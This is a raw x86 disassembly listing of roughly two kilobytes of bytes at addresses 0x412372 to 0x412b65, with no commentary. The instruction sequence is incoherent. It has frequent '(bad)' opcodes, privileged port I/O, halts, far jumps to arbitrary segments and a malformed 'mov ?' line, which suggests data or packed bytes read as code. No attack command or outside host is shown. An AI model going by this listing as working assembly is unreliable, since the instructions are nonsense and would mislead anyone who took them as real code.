  412372:	nop
  412373:	add    DWORD PTR [esi+edx*1-0x38],0xffffffa7
  412378:	mov    dl,0xc6
  41237a:	push   esp
  41237b:	or     dl,BYTE PTR [eax+esi*8]
  41237e:	dec    edi
  41237f:	fidivr DWORD PTR [edx+0x3f]
  412382:	lea    ebp,[ebx]
  412384:	pop    esi
  412385:	pop    eax
  412386:	cmc    
  412387:	mov    ebx,0x137297d
  41238c:	mov    ebp,0xea353153
  412391:	call   0xaf3e:0x6b811bc9
  412398:	xlat   BYTE PTR ds:[ebx]
  412399:	dec    ebx
  41239a:	cmp    eax,0xb6dc04f3
  41239f:	jbe    0x412321
  4123a1:	xor    ch,al
  4123a3:	push   ss
  4123a4:	mov    ?,WORD PTR [ebp+0x46b6ba86]
  4123aa:	or     esp,edi
  4123ac:	fcomp  DWORD PTR [ebx]
  4123ae:	jno    0x412396
  4123b0:	arpl   WORD PTR [ebp+0x40caee0a],cx
  4123b6:	cli    
  4123b7:	mov    ebx,0x848e680e
  4123bc:	sbb    BYTE PTR [esi+0x30],bh
  4123bf:	sbb    al,0x9f
  4123c1:	push   eax
  4123c2:	inc    ebx
  4123c3:	out    0x58,eax
  4123c5:	pop    ds
  4123c6:	enter  0x7bb3,0x99
  4123ca:	sbb    BYTE PTR [esi],ah
  4123cc:	in     al,dx
  4123cd:	cli    
  4123ce:	test   BYTE PTR [ecx+0x586801ca],al
  4123d4:	cmp    ecx,DWORD PTR [edi]
  4123d6:	lahf   
  4123d7:	ss xor eax,0xa201dbfc
  4123dd:	je     0x4123aa
  4123df:	dec    ebp
  4123e0:	jge    0x412436
  4123e2:	cmc    
  4123e3:	xchg   edi,eax
  4123e4:	jge    0x4123f6
  4123e6:	push   es
  4123e7:	mov    ah,BYTE PTR [eax-0x561c95c8]
  4123ed:	(bad)  
  4123ee:	jp     0x4123e9
  4123f0:	sbb    al,0x20
  4123f2:	lods   eax,DWORD PTR ds:[esi]
  4123f3:	jl     0x4123a8
  4123f5:	mov    ah,0x73
  4123f7:	out    0xd2,al
  4123f9:	pop    ecx
  4123fa:	fst    DWORD PTR [esi-0x12c9cd28]
  412400:	pop    es
  412401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412402:	retf   0xab43
  412405:	dec    ecx
  412406:	cld    
  412407:	lods   eax,DWORD PTR ds:[esi]
  412408:	add    BYTE PTR [esi+0x6c8d0c26],al
  41240e:	or     DWORD PTR [ebp+0x32],0xffffffc7
  412412:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412413:	cmp    esp,DWORD PTR [edi]
  412415:	les    eax,FWORD PTR [esi]
  412417:	shr    edi,1
  412419:	sbb    ah,BYTE PTR [eax*2-0x4d5ada93]
  412420:	push   0xc5fdcd32
  412425:	mov    bh,0xab
  412427:	mov    dh,0xb1
  412429:	arpl   WORD PTR fs:[ecx],bx
  41242c:	mov    edx,edi
  41242e:	or     bl,BYTE PTR [esi]
  412430:	push   eax
  412431:	xchg   ebp,eax
  412432:	adc    DWORD PTR [eax+0x17],0x16
  412436:	lock pop es
  412438:	inc    edi
  412439:	inc    esp
  41243a:	or     ch,ch
  41243c:	xlat   BYTE PTR ds:[ebx]
  41243d:	pop    edx
  41243e:	aaa    
  41243f:	mov    ecx,0xc789529b
  412444:	aas    
  412445:	in     eax,0xc1
  412447:	xor    BYTE PTR [edx+0x504da30a],al
  41244d:	dec    ebp
  41244e:	(bad)  
  41244f:	xchg   esi,eax
  412450:	add    bl,BYTE PTR [ebp+esi*1-0x7b]
  412454:	int3   
  412455:	dec    ebx
  412456:	(bad)  
  412457:	pusha  
  412458:	mov    al,0xd
  41245a:	cmp    ebx,DWORD PTR [edi]
  41245c:	bound  ebp,QWORD PTR [ecx+0x72001fca]
  412462:	cld    
  412463:	es push 0x54a71ced
  412469:	stc    
  41246a:	stc    
  41246b:	hlt    
  41246c:	xor    edx,DWORD PTR [edx]
  41246e:	mov    cl,0x5a
  412470:	inc    esp
  412471:	lahf   
  412472:	cmp    al,0x3d
  412474:	mov    al,ch
  412476:	cmp    al,0x73
  412478:	fld    st(4)
  41247a:	push   ebx
  41247b:	mov    ah,0x6
  41247d:	stc    
  41247e:	push   0xd6e2236
  412483:	xchg   DWORD PTR [ecx-0x763f9615],esp
  412489:	out    dx,al
  41248a:	ret    0xf8e1
  41248d:	stos   DWORD PTR es:[edi],eax
  41248e:	xor    DWORD PTR [ebx+0x742ad24a],ebx
  412494:	xor    bl,dl
  412496:	push   es
  412497:	in     eax,0x75
  412499:	cmp    DWORD PTR [ebx+0x7ab36b17],edx
  41249f:	jmp    0x492c:0xa8e2825e
  4124a6:	(bad)  
  4124a7:	mov    BYTE PTR [ecx-0x4e502d51],dl
  4124ad:	xchg   esi,eax
  4124ae:	add    DWORD PTR [esi],ecx
  4124b0:	pop    ds
  4124b1:	or     BYTE PTR [ebx+0xb],dh
  4124b4:	aaa    
  4124b5:	pcmpeqb mm3,mm3
  4124b8:	ja     0x4124de
  4124ba:	adc    DWORD PTR [edx+eiz*2+0x26],0xfffffff9
  4124bf:	inc    eax
  4124c0:	loop   0x41250f
  4124c2:	stos   DWORD PTR es:[edi],eax
  4124c3:	gs pushf 
  4124c5:	mov    edx,0xe7f760b0
  4124ca:	pop    ecx
  4124cb:	fdivrp st(4),st
  4124cd:	xor    DWORD PTR [esi-0x4b813708],ebp
  4124d3:	sub    al,BYTE PTR [ebp+0x15]
  4124d6:	xchg   ebx,eax
  4124d7:	xor    edi,DWORD PTR [edi+ebp*1+0x5b]
  4124db:	ins    DWORD PTR es:[edi],dx
  4124dc:	mov    eax,0xb046cb94
  4124e1:	cli    
  4124e2:	rcl    BYTE PTR [eax-0x15f8a1b4],0xb
  4124e9:	(bad)  
  4124ea:	mov    cl,0xa0
  4124ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124ed:	mov    ah,0x89
  4124ef:	fmul   st,st(5)
  4124f1:	push   ds
  4124f2:	add    al,0xf5
  4124f4:	inc    eax
  4124f5:	inc    edi
  4124f6:	(bad)  
  4124f7:	mov    eax,0xbaa2afa3
  4124fc:	retf   0xc5d7
  4124ff:	stc    
  412500:	and    al,BYTE PTR [ecx]
  412502:	jne    0x4124f2
  412504:	mov    cl,0xa
  412506:	sbb    ebx,ecx
  412508:	loope  0x412500
  41250a:	scas   al,BYTE PTR es:[edi]
  41250b:	fdivr  QWORD PTR [edx]
  41250d:	or     eax,0xcbf02012
  412512:	rcl    DWORD PTR [ecx+0x1950e777],0x5c
  412519:	and    dh,BYTE PTR [esi]
  41251b:	mov    edx,0x48f1a57a
  412520:	cmp    DWORD PTR [ebx-0x2e90f019],esi
  412526:	and    DWORD PTR [ebx],ecx
  412528:	mov    ebp,0x4d471c8
  41252d:	xchg   esi,eax
  41252e:	adc    DWORD PTR [edi+ebx*2-0x7eea2b79],esi
  412535:	mov    dl,0xdd
  412537:	xchg   ecx,eax
  412538:	pop    edi
  412539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41253a:	jne    0x41252d
  41253c:	cmp    ah,0x61
  41253f:	sbb    eax,0x19feb274
  412544:	jmp    0x639f:0x88b7df69
  41254b:	cmp    eax,0x59ab3775
  412550:	xlat   BYTE PTR ds:[ebx]
  412551:	outs   dx,DWORD PTR ds:[esi]
  412552:	or     esp,esi
  412554:	(bad)  
  412555:	xor    ecx,DWORD PTR [eax]
  412557:	jno    0x412596
  412559:	addr16 mov ds:0xf900,al
  41255d:	jg     0x4125af
  41255f:	add    esp,esi
  412561:	in     al,0xdd
  412563:	test   eax,0x79afc79
  412568:	icebp  
  412569:	or     eax,0x43bd8121
  41256e:	jp     0x41258c
  412570:	or     al,0x3
  412572:	pop    eax
  412573:	xor    eax,0xa1535d76
  412578:	leave  
  412579:	sbb    ebx,DWORD PTR ds:0x9fa54d18
  41257f:	ins    DWORD PTR es:[edi],dx
  412580:	or     BYTE PTR [ebp+0x1481c1e2],al
  412586:	data16 fidivr DWORD PTR [eax-0x7783bb76]
  41258d:	cmp    al,0x96
  41258f:	int    0xbe
  412591:	pop    edx
  412592:	fiadd  DWORD PTR [ebp+0xe]
  412595:	into   
  412596:	iret   
  412597:	rol    BYTE PTR [ecx+0x685dafc4],1
  41259d:	mov    DWORD PTR [edi+0x644118fd],ebp
  4125a3:	stc    
  4125a4:	lahf   
  4125a5:	cld    
  4125a6:	mov    ebx,0x7a2187c4
  4125ab:	fistp  DWORD PTR [edx+0x4d0ce2a6]
  4125b1:	mov    ebp,0x47563706
  4125b6:	inc    esp
  4125b7:	loop   0x4125ee
  4125b9:	loope  0x4125e5
  4125bb:	xchg   ebp,eax
  4125bc:	inc    edi
  4125bd:	mov    al,BYTE PTR [ecx+0x7166ff58]
  4125c3:	add    bl,bl
  4125c5:	push   ebp
  4125c6:	repnz mov eax,ds:0xdde751d6
  4125cc:	pusha  
  4125cd:	push   ebp
  4125ce:	ud0    edi,DWORD PTR [eax+0x7a]
  4125d2:	add    esp,0x3eda2ffe
  4125d8:	push   0x11
  4125da:	sub    BYTE PTR [edx+0x31e5c1e3],ch
  4125e0:	xchg   ebx,eax
  4125e1:	inc    esp
  4125e2:	into   
  4125e3:	inc    esi
  4125e4:	(bad)
  4125e7:	or     al,0xc4
  4125e9:	sbb    DWORD PTR ds:0x42bf1e88,esi
  4125ef:	add    BYTE PTR [esi],al
  4125f1:	mov    ch,ah
  4125f3:	xor    al,0x76
  4125f5:	arpl   WORD PTR [edx-0x636f8ed2],si
  4125fb:	sub    DWORD PTR [eax-0x39],esi
  4125fe:	gs repnz adc eax,0x381f1175
  412605:	mov    ebx,0x97fded00
  41260a:	sbb    DWORD PTR [ebp+0x276ffcce],eax
  412610:	mov    WORD PTR [ecx+0x2e],ss
  412613:	aas    
  412614:	xor    al,0x5c
  412616:	sub    ch,BYTE PTR [ebx+0x8763936]
  41261c:	xor    al,BYTE PTR [edx]
  41261e:	outs   dx,DWORD PTR ds:[esi]
  41261f:	stos   DWORD PTR es:[edi],eax
  412620:	fist   WORD PTR [ebx-0x333f30a4]
  412626:	mov    WORD PTR [edx],fs
  412628:	aad    0x12
  41262a:	mov    edi,0xcbf6dcc9
  41262f:	(bad)  
  412630:	ror    DWORD PTR [ebx],1
  412632:	xchg   dh,cl
  412634:	adc    DWORD PTR [ecx],eax
  412636:	je     0x4126aa
  412638:	(bad)  
  412639:	and    ch,BYTE PTR [ebp+ebx*8+0x415fe203]
  412640:	xor    al,0x69
  412642:	enter  0x605b,0x5e
  412646:	pop    esi
  412647:	aaa    
  412648:	popf   
  412649:	(bad)  
  41264b:	out    dx,al
  41264c:	hlt    
  41264d:	jno    0x4125cf
  41264f:	fisttp QWORD PTR [esi+0x69b03e6]
  412655:	or     cl,0xde
  412658:	xchg   esi,eax
  412659:	add    esi,DWORD PTR [esi-0x40]
  41265c:	add    BYTE PTR [esi+0x5af0156b],ah
  412662:	and    BYTE PTR [edi+0x1f6b8497],0xa1
  412669:	xchg   ebp,eax
  41266a:	scas   al,BYTE PTR es:[edi]
  41266b:	pop    es
  41266c:	outs   dx,DWORD PTR ds:[esi]
  41266d:	daa    
  41266e:	repz adc eax,0xdabef986
  412674:	push   ebp
  412675:	push   esi
  412676:	call   0x846f:0xe252abec
  41267d:	outs   dx,DWORD PTR ds:[esi]
  41267e:	repnz test al,0x27
  412681:	add    al,0x1
  412683:	dec    ebx
  412684:	pop    ds
  412685:	dec    BYTE PTR [eax+0x305e9191]
  41268b:	ret    
  41268c:	jmp    0x98a0:0x7e2bd955
  412693:	ficom  DWORD PTR [ebp-0x5ec09fb9]
  412699:	sbb    DWORD PTR [ecx],eax
  41269b:	push   ds
  41269c:	and    al,0xc
  41269e:	out    dx,al
  41269f:	push   edi
  4126a0:	fdivp  st(4),st
  4126a2:	xchg   DWORD PTR [ebx+0x2284cedd],eax
  4126a8:	xor    eax,0x3addbc2e
  4126ad:	or     DWORD PTR [edx+0x35ba3695],edi
  4126b3:	popf   
  4126b4:	leave  
  4126b5:	dec    esi
  4126b6:	xor    bl,bh
  4126b8:	push   eax
  4126b9:	mov    ah,0xe8
  4126bb:	pop    esp
  4126bc:	inc    ecx
  4126bd:	sbb    eax,0x85b3b130
  4126c2:	adc    DWORD PTR [esi],0xdf666ecf
  4126c8:	(bad)  
  4126c9:	sbb    ecx,DWORD PTR gs:[ebp+0xc]
  4126cd:	stos   BYTE PTR es:[edi],al
  4126ce:	add    BYTE PTR [ebx+0x3e4b4c57],ah
  4126d4:	xchg   edx,eax
  4126d5:	gs cdq 
  4126d7:	xchg   DWORD PTR ds:0xea5921a4,eax
  4126dd:	(bad)  
  4126de:	lods   al,BYTE PTR ds:[esi]
  4126df:	hlt    
  4126e0:	push   0xad1ef8c
  4126e5:	mov    ebp,0x66501f2e
  4126ea:	addr16 nop
  4126ec:	cmp    al,0xdd
  4126ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126ef:	arpl   ax,si
  4126f1:	xchg   esi,eax
  4126f2:	in     eax,dx
  4126f3:	jne    0x41272b
  4126f5:	out    dx,eax
  4126f6:	mov    ds:0xefbceb8f,eax
  4126fb:	sub    al,0x1a
  4126fd:	int3   
  4126fe:	jecxz  0x412761
  412700:	ret    
  412701:	push   DWORD PTR [edx]
  412703:	jne    0x412773
  412705:	push   edx
  412706:	sub    eax,0xe2d46108
  41270b:	iret   
  41270c:	call   0x11db257f
  412711:	jg     0x4126a6
  412713:	xor    dl,BYTE PTR [edx-0x42120b35]
  412719:	pop    eax
  41271a:	inc    esi
  41271b:	mov    bh,0x41
  41271d:	add    al,0x24
  41271f:	xchg   edi,eax
  412720:	mov    edi,0x10cbf774
  412725:	sbb    eax,0x92b9f80a
  41272a:	in     eax,0x8c
  41272c:	popa   
  41272d:	arpl   WORD PTR [ebp+0x569771a6],ax
  412733:	ret    0xa8e4
  412736:	std    
  412737:	lock cmp eax,0xdb8aea9a
  41273d:	retf   
  41273e:	ror    BYTE PTR [edi],1
  412740:	sub    DWORD PTR [edx+0x27653b84],esi
  412746:	mov    cl,0xae
  412748:	stos   DWORD PTR es:[edi],eax
  412749:	pop    esi
  41274a:	cmp    al,0x5a
  41274c:	or     BYTE PTR [ecx+ebp*2+0x1c466ace],ch
  412753:	(bad)  
  412754:	lea    edi,[ebx-0x3f28a296]
  41275a:	shl    BYTE PTR [edx-0x13],cl
  41275d:	das    
  41275e:	bound  esi,QWORD PTR [edx-0x7f3f032c]
  412764:	div    BYTE PTR [ebx-0x42]
  412767:	dec    ebx
  412768:	inc    eax
  412769:	mov    ds:0x6afcb78d,eax
  41276e:	push   ds
  41276f:	test   DWORD PTR [esi],edi
  412771:	shr    DWORD PTR [edi+0x7a5890f4],1
  412777:	mov    esp,0x12de0833
  41277c:	mov    bl,0x68
  41277e:	clc    
  41277f:	hlt    
  412780:	sahf   
  412781:	popa   
  412782:	lods   eax,DWORD PTR ds:[esi]
  412783:	xchg   edi,eax
  412784:	xchg   ebp,eax
  412785:	icebp  
  412786:	and    al,0x99
  412788:	pop    ss
  412789:	add    dl,BYTE PTR [esi]
  41278b:	sub    ebp,DWORD PTR [eax-0xf]
  41278e:	xor    bl,dl
  412790:	push   0x45
  412792:	shl    DWORD PTR [esi+0x25aafc31],cl
  412798:	dec    ebp
  412799:	inc    edx
  41279a:	ret    0x766d
  41279d:	daa    
  41279e:	(bad)  
  41279f:	popa   
  4127a0:	mov    cs,WORD PTR [ebx]
  4127a2:	and    DWORD PTR [ecx-0xd],0xde0e5ff7
  4127a9:	enter  0x7c5c,0x21
  4127ad:	test   DWORD PTR [edi],edi
  4127af:	fdivr  DWORD PTR [esi-0x57692715]
  4127b5:	push   ss
  4127b6:	shl    BYTE PTR [eax-0x13],0x48
  4127ba:	mov    WORD PTR [edx-0x7c],ss
  4127bd:	js     0x412822
  4127bf:	mov    dh,0xda
  4127c1:	(bad)  
  4127c2:	shl    BYTE PTR [eax],cl
  4127c4:	jbe    0x412776
  4127c6:	xchg   esi,eax
  4127c7:	fsub   QWORD PTR [ebx+edi*8]
  4127ca:	sbb    cl,al
  4127cc:	lods   eax,DWORD PTR ds:[esi]
  4127cd:	(bad)  
  4127ce:	sub    eax,0x34f7f99b
  4127d3:	aad    0x13
  4127d5:	jmp    0x41275d
  4127d7:	outs   dx,BYTE PTR ds:[esi]
  4127d8:	xor    dl,bh
  4127da:	jmp    0xf07aae99
  4127df:	fidivr DWORD PTR [esi]
  4127e1:	mov    cs,ebp
  4127e3:	sti    
  4127e4:	pop    edi
  4127e5:	data16 ins BYTE PTR es:[edi],dx
  4127e7:	(bad)  [ecx]
  4127e9:	pop    ss
  4127ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127eb:	add    eax,edx
  4127ed:	ss popa 
  4127ef:	jo     0x4127a9
  4127f1:	or     eax,0xff638077
  4127f6:	dec    ebp
  4127f7:	pop    ss
  4127f8:	jmp    edx
  4127fa:	push   0x31805e3c
  4127ff:	call   FWORD PTR [ebp-0x3109ef8]
  412805:	es loopne 0x412830
  412808:	mov    edi,0xc0b34176
  41280d:	pusha  
  41280e:	daa    
  41280f:	and    al,0x27
  412811:	push   edx
  412812:	arpl   WORD PTR [ecx+eiz*4],di
  412815:	fstp   QWORD PTR [ebp+0x471228e0]
  41281b:	(bad)  
  41281c:	aad    0x55
  41281e:	retf   
  41281f:	(bad)  
  412821:	mov    ds:0x6b0b8bda,eax
  412826:	add    DWORD PTR [ebp*1-0x64dad727],eax
  41282d:	mov    ebx,0xea8c254b
  412832:	mov    esp,0xe9998255
  412837:	lea    esp,[ecx]
  412839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41283a:	add    al,0xa2
  41283c:	pop    esi
  41283d:	lds    ebp,FWORD PTR [edi]
  41283f:	add    eax,0xf2b4cbcb
  412844:	sub    ebx,DWORD PTR [eax]
  412846:	pop    ecx
  412847:	dec    edi
  412848:	sub    BYTE PTR [ecx+0x352f79d0],al
  41284e:	popf   
  41284f:	jne    0x4128a7
  412851:	sbb    cl,cl
  412853:	and    BYTE PTR ds:0xd95e058b,0x66
  41285a:	pop    esp
  41285b:	adc    ebx,DWORD PTR [eax+0x7a]
  41285e:	(bad)  
  41285f:	stc    
  412860:	xchg   esp,eax
  412861:	aas    
  412862:	fdiv   QWORD PTR [ebx+esi*2+0x78]
  412866:	out    0x6f,eax
  412868:	retf   
  412869:	paddb  mm2,QWORD PTR [esi-0x7b94062c]
  412870:	ins    DWORD PTR es:[edi],dx
  412871:	inc    edx
  412872:	xchg   edi,eax
  412873:	dec    ecx
  412874:	leave  
  412875:	imul   edi,DWORD PTR [ebp-0x1],0x8e067a77
  41287c:	lahf   
  41287d:	outs   dx,DWORD PTR ds:[esi]
  41287e:	jno    0x412832
  412880:	xor    BYTE PTR [eax+0x38],ch
  412883:	bound  edi,QWORD PTR ds:0x2db5d7cc
  412889:	repnz das 
  41288b:	sar    DWORD PTR [eax],0x7e
  41288e:	popa   
  41288f:	xchg   esp,eax
  412890:	mov    ah,0x5f
  412892:	dec    ebx
  412893:	mov    BYTE PTR [edi],ch
  412895:	loope  0x412913
  412897:	or     BYTE PTR [ecx+0x4b],ah
  41289a:	and    al,0xf1
  41289c:	adc    edi,DWORD PTR [esi+0x86fc634]
  4128a2:	dec    esp
  4128a3:	push   edx
  4128a4:	cwde   
  4128a5:	sbb    al,dl
  4128a7:	outs   dx,BYTE PTR ds:[esi]
  4128a8:	iret   
  4128a9:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4128ab:	push   0xf4eff0b
  4128b0:	sti    
  4128b1:	scas   eax,DWORD PTR es:[edi]
  4128b2:	adc    DWORD PTR [eax],esp
  4128b4:	mov    ebx,0x38fc93d
  4128b9:	add    DWORD PTR [esi-0x1abe481],esp
  4128bf:	shl    BYTE PTR [ebx+0x570aa78b],cl
  4128c5:	mov    edi,0x6c7052b2
  4128ca:	test   BYTE PTR [edi+0xf11d49a],cl
  4128d0:	pushf  
  4128d1:	jp     0x412911
  4128d3:	inc    edi
  4128d4:	imul   edx,ebx,0xffffffa0
  4128d7:	pop    eax
  4128d8:	push   ds
  4128d9:	nop
  4128da:	in     eax,0x3d
  4128dc:	fcom   DWORD PTR ds:0x2a23ab20
  4128e2:	(bad)  
  4128e3:	push   esi
  4128e4:	add    eax,0xf8835495
  4128e9:	pop    ss
  4128ea:	scas   al,BYTE PTR es:[edi]
  4128eb:	dec    ebx
  4128ec:	js     0x412938
  4128ee:	ins    BYTE PTR es:[edi],dx
  4128ef:	(bad)  
  4128f0:	cs out 0x9f,eax
  4128f3:	cwde   
  4128f4:	jnp    0x41295e
  4128f6:	inc    ebp
  4128f7:	daa    
  4128f8:	jmp    0x9441:0xbed37c97
  4128ff:	push   esp
  412900:	mov    ch,0x50
  412902:	xchg   BYTE PTR [ebp+0xd854a9d],ch
  412908:	std    
  412909:	sbb    edx,0x7734e273
  41290f:	or     al,0xe2
  412911:	or     al,0x69
  412913:	push   ss
  412914:	inc    esi
  412915:	xor    edi,DWORD PTR [ebx+eax*4+0x44]
  412919:	pop    eax
  41291a:	xchg   ecx,eax
  41291b:	jo     0x4128f0
  41291d:	loopne 0x4128d2
  41291f:	retf   
  412920:	xchg   DWORD PTR [ecx+0x40c141de],ebp
  412926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412927:	jne    0x412945
  412929:	shl    dl,cl
  41292b:	or     cl,al
  41292d:	mov    ds:0xfa6e69c9,al
  412932:	(bad)
  412935:	mov    DWORD PTR ds:0xe053d222,0x85d19edc
  41293f:	ficomp DWORD PTR [eax-0x64]
  412942:	xchg   edx,eax
  412943:	(bad)  
  412944:	mov    ds:0xccea16e1,al
  412949:	(bad)  
  41294a:	std    
  41294b:	mov    ah,0x6f
  41294d:	xor    ebx,DWORD PTR [ecx+0x7ceda69a]
  412953:	xchg   esi,eax
  412954:	ror    BYTE PTR [ebx-0x4dc4bab5],1
  41295a:	inc    eax
  41295b:	jp     0x4128e4
  41295d:	sbb    bl,0xe3
  412960:	xor    al,0xce
  412962:	ss jae 0x412957
  412965:	scas   eax,DWORD PTR es:[edi]
  412966:	test   edi,esp
  412968:	enter  0x6d2a,0xe9
  41296c:	inc    esi
  41296d:	inc    esp
  41296e:	pop    esi
  41296f:	adc    edi,DWORD PTR [eax-0x30414f4b]
  412975:	and    DWORD PTR [ecx-0x68ac5c8e],esp
  41297b:	sbb    ebp,eax
  41297d:	add    BYTE PTR [esi-0x707b9663],bl
  412983:	pusha  
  412984:	fstp   QWORD PTR [ebx]
  412986:	std    
  412987:	mov    bh,0xc2
  412989:	ds mov edx,0xd223cab0
  41298f:	test   dh,ah
  412991:	not    DWORD PTR [ecx+0x472923f0]
  412997:	push   cs
  412998:	pop    ds
  412999:	xor    BYTE PTR ds:0x8028e688,ah
  41299f:	and    ah,dh
  4129a1:	or     al,0xa9
  4129a3:	adc    al,0xa6
  4129a5:	in     eax,0x60
  4129a7:	cmp    ebp,DWORD PTR ds:0xadb152d3
  4129ad:	cmp    eax,0xc0539681
  4129b2:	and    bl,cl
  4129b4:	inc    esp
  4129b5:	xlat   BYTE PTR ds:[ebx]
  4129b6:	rep ins DWORD PTR es:[edi],dx
  4129b8:	xor    ah,ah
  4129ba:	arpl   WORD PTR [ebp-0x24],si
  4129bd:	imul   esp,DWORD PTR ss:[ecx-0x4f501199],0xbea6c429
  4129c8:	enter  0x810,0x4e
  4129cc:	bound  ecx,QWORD PTR [esi+0x1a47907d]
  4129d2:	mov    edi,0x252770df
  4129d7:	sbb    al,0x1c
  4129d9:	ficomp DWORD PTR ds:0xfed5ae95
  4129df:	repnz test ebx,0xe0e319ba
  4129e6:	mov    WORD PTR [esi],ds
  4129e8:	shl    BYTE PTR [esi],cl
  4129ea:	sub    DWORD PTR [ecx+0x49],ebx
  4129ed:	pop    ecx
  4129ee:	cmc    
  4129ef:	fdivrp st(0),st
  4129f1:	inc    edx
  4129f2:	test   DWORD PTR [eax+0x4c],edx
  4129f5:	rcr    BYTE PTR ds:0x56e1b3e8,0x3
  4129fc:	lock aas 
  4129fe:	xchg   edi,eax
  4129ff:	jne    0x412a14
  412a01:	xor    eax,DWORD PTR [edx+0x3e343d3c]
  412a07:	pop    eax
  412a08:	fisub  DWORD PTR [esi+0x34]
  412a0b:	xchg   edx,eax
  412a0c:	jmp    0x6e5:0xfc552794
  412a13:	std    
  412a14:	sbb    DWORD PTR [esi+0x2f],0x52
  412a18:	push   0x544a8eed
  412a1d:	sbb    eax,0x4e477202
  412a22:	test   BYTE PTR [ebp+0x615d174c],cl
  412a28:	mov    edi,0x99c532ba
  412a2d:	cs (bad) 
  412a2f:	fsubr  DWORD PTR [edi]
  412a31:	cmp    al,0xd5
  412a33:	and    esi,DWORD PTR [ecx+ebx*8]
  412a36:	test   eax,0x6a12d4e6
  412a3b:	not    esp
  412a3d:	lods   eax,DWORD PTR ds:[esi]
  412a3e:	daa    
  412a3f:	mov    ah,0xa0
  412a41:	pop    edi
  412a42:	add    eax,0x2cb8a8d3
  412a47:	dec    ebx
  412a48:	ror    BYTE PTR [edx-0x10],0x7b
  412a4c:	lock mov ebp,ecx
  412a4f:	(bad)  
  412a50:	jbe    0x412a1a
  412a52:	push   es
  412a53:	in     al,0x48
  412a55:	enter  0x38fd,0x83
  412a59:	xor    ebp,ebp
  412a5b:	hlt    
  412a5c:	repz in eax,dx
  412a5e:	not    dl
  412a60:	jle    0x412a93
  412a62:	sahf   
  412a63:	mov    DWORD PTR [ebx],ebp
  412a65:	adc    ecx,DWORD PTR [ebp+ebp*2+0x5776541a]
  412a6c:	mov    ds:0x8e94c389,eax
  412a71:	popa   
  412a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a73:	mov    bh,cl
  412a75:	and    dh,BYTE PTR ds:0x7f584b28
  412a7b:	ror    dh,cl
  412a7d:	dec    eax
  412a7e:	inc    ecx
  412a7f:	sbb    eax,0xb3121b12
  412a84:	in     al,0x93
  412a86:	cwde   
  412a87:	add    BYTE PTR [ebx+0x2d1e77f4],ch
  412a8d:	inc    edi
  412a8e:	push   eax
  412a8f:	(bad)  
  412a90:	rcr    DWORD PTR [esi+0x7c],cl
  412a93:	rcr    ebp,0x1d
  412a96:	je     0x412a4f
  412a98:	pop    edx
  412a99:	outs   dx,DWORD PTR ds:[esi]
  412a9a:	jmp    0x45cc87ea
  412a9f:	push   edx
  412aa0:	xor    eax,0x95337df2
  412aa5:	rol    ch,cl
  412aa7:	stos   BYTE PTR es:[edi],al
  412aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aa9:	jae    0x412a9f
  412aab:	std    
  412aac:	mov    DWORD PTR [eax+0x5],esp
  412aaf:	arpl   WORD PTR [esp+ebp*1+0x2fb4d8d4],ax
  412ab6:	imul   esp,DWORD PTR [ebp-0x7a],0xfffffffe
  412aba:	daa    
  412abb:	(bad)  
  412abc:	aad    0xe4
  412abe:	call   0xc2e63deb
  412ac3:	test   DWORD PTR [eax-0x40],0xf824a990
  412aca:	cdq    
  412acb:	dec    ebp
  412acc:	cmp    al,0x1a
  412ace:	mov    bl,0xb0
  412ad0:	adc    al,0x6b
  412ad2:	xchg   dh,ah
  412ad4:	fmul   DWORD PTR [ebp+esi*1-0x34a7da45]
  412adb:	mov    edi,0x61186d14
  412ae0:	ins    DWORD PTR es:[edi],dx
  412ae1:	pop    ebx
  412ae2:	cmp    al,0xde
  412ae4:	xchg   edx,eax
  412ae5:	stos   DWORD PTR es:[edi],eax
  412ae6:	xlat   BYTE PTR ds:[ebx]
  412ae7:	add    eax,0x6afec517
  412aec:	xlat   BYTE PTR ds:[ebx]
  412aed:	popa   
  412aee:	jge    0x412b64
  412af0:	jbe    0x412b6a
  412af2:	stos   BYTE PTR es:[edi],al
  412af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412af4:	push   ecx
  412af5:	push   eax
  412af6:	pop    edx
  412af7:	push   ecx
  412af8:	or     eax,0x6d7f5ddb
  412afd:	push   eax
  412afe:	or     BYTE PTR ds:0xa160f688,bh
  412b04:	mov    al,0x68
  412b06:	cli    
  412b07:	push   edx
  412b08:	imul   esp,DWORD PTR [ecx],0x1e
  412b0b:	(bad)  
  412b0c:	int3   
  412b0d:	cmp    cl,BYTE PTR [ebx+0x6bff895]
  412b13:	lods   al,BYTE PTR ds:[esi]
  412b14:	sbb    BYTE PTR [edi],al
  412b16:	cmp    eax,0xc92c790a
  412b1b:	push   edx
  412b1c:	test   al,0xb4
  412b1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b1f:	xchg   esp,eax
  412b20:	jge    0x412af9
  412b22:	call   0x99e58f5c
  412b27:	inc    edi
  412b28:	cmp    ch,dl
  412b2a:	dec    DWORD PTR [edi-0xe]
  412b2d:	push   ebp
  412b2e:	test   DWORD PTR [ecx],esi
  412b30:	stc    
  412b31:	lahf   
  412b32:	cmc    
  412b33:	or     BYTE PTR [esi-0x6cd8857f],ch
  412b39:	mov    al,0xe0
  412b3b:	lods   al,BYTE PTR ds:[esi]
  412b3c:	mov    ch,0x40
  412b3e:	mov    bh,0x2f
  412b40:	daa    
  412b41:	addr16 mov bl,0xdb
  412b44:	or     BYTE PTR [ebx-0x34],bl
  412b47:	mov    esi,0xa7942f0e
  412b4c:	in     al,0x4a
  412b4e:	cmp    al,0x3
  412b50:	pavgb  mm3,QWORD PTR [esi+edi*1]
  412b54:	cs jo  0x412b71
  412b57:	fsub   QWORD PTR [edx+0x49]
  412b5a:	clc    
  412b5b:	lods   al,BYTE PTR cs:[esi]
  412b5d:	push   es
  412b5e:	imul   eax,DWORD PTR [eax+0x51],0x698c6c86
  412b65:	das    
